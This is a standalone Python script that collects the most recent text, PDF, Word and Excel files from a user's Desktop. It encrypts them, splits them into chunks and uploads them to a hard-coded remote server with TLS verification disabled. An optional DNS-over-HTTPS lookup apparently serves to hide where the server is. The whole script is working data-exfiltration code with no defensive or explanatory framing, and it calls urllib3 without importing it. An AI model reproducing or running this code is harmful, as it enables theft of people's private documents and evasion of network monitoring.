import os
import glob
import requests
import random
import time
import base64
import httpx
from datetime import datetime
from dnslib import DNSRecord
from colorama import Fore, init
from cryptography.fernet import Fernet

init(autoreset=True)

urllib3.disable_warnings()

# Generate encryption key
key = Fernet.generate_key()
cipher_suite = Fernet(key)

CHUNK_SIZE = 1024 * 50  # 50 KB per chunk
DOH_URLS = [
    "https://cloudflare-dns.com/dns-query",
    "https://dns.google/dns-query",
    "https://dns.quad9.net/dns-query",
    "https://dns.cloudflare.com/dns-query"
]

def create_dns_query(domain):
    return DNSRecord.question(domain, "A").pack()

def decode_dns_response(data):
    response = DNSRecord.parse(data)
    server_ip = None  

    for answer in response.rr:
        if answer.rtype == 1:
            server_ip = str(answer.rdata)
            print(f"{Fore.GREEN}[+] Retrieved IP: {server_ip}")

    return server_ip  

def doh_query(domain, doh_url):
    query = create_dns_query(domain)
    headers = {'Content-Type': 'application/dns-message', 'Accept': 'application/dns-message'}
    dns_query_b64 = base64.urlsafe_b64encode(query).decode('utf-8').rstrip('=')
    full_url = f"{doh_url}?dns={dns_query_b64}"

    with httpx.Client(http2=True, verify=False) as client:
        response = client.get(full_url, headers=headers)
        response.raise_for_status()
        return decode_dns_response(response.content)

def get_important_files(directory, number_of_files):
    print(f"{Fore.CYAN}[ * ] Fetching important files from {directory}")
    file_types = ('*.txt', '*.pdf', '*.docx', '*.xlsx')
    important_files = []

    for file_type in file_types:
        important_files.extend(glob.glob(os.path.join(directory, file_type)))

    important_files.sort(key=lambda x: os.path.getmtime(x), reverse=True)
    return important_files[:number_of_files]

def send_file_in_chunks(file_path, server_ip, cipher_suite):
    try:
        file_size = os.path.getsize(file_path)
    except FileNotFoundError:
        print(f"{Fore.RED}[!] File not found: {file_path}")
        return
    
    file_name = os.path.basename(file_path)
    server_url = f"https://{server_ip}:5000/upload"
    
    with open(file_path, 'rb') as f:
        for chunk_number in range(0, file_size, CHUNK_SIZE):
            chunk_data = f.read(CHUNK_SIZE)
            encrypted_chunk = cipher_suite.encrypt(chunk_data)
            files = {
                'file': (file_name, encrypted_chunk),
                'chunk_number': (None, str(chunk_number)),
                'total_size': (None, str(file_size)),
                'key': (None, base64.urlsafe_b64encode(key).decode('utf-8'))
            }
            try:
                response = requests.post(server_url, files=files, verify=False)
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] Successfully uploaded chunk {chunk_number // CHUNK_SIZE} of {file_name}")
                else:
                    print(f"{Fore.RED}[!] Failed to upload chunk {chunk_number // CHUNK_SIZE}")
                    break
            except requests.RequestException as e:
                print(f"{Fore.RED}[!] Error during upload: {e}")
            time.sleep(0.5)

if __name__ == "__main__":
    desktop_dir = os.path.join(os.path.expanduser("~"), "Desktop")
    important_files = get_important_files(desktop_dir, 5)
    domain = "example.com"
    server_ip = "192.168.1.6"
    
    if server_ip == "0":
        chosen_doh = random.choice(DOH_URLS)
        resolved_ip = doh_query(domain, chosen_doh)
        if resolved_ip:
            server_ip = resolved_ip 
    
    if server_ip and server_ip != "0":
        for file in important_files:
            send_file_in_chunks(file, server_ip, cipher_suite)
    else:
        print(f"{Fore.RED}[!] No valid server IP found. Aborting file upload.")
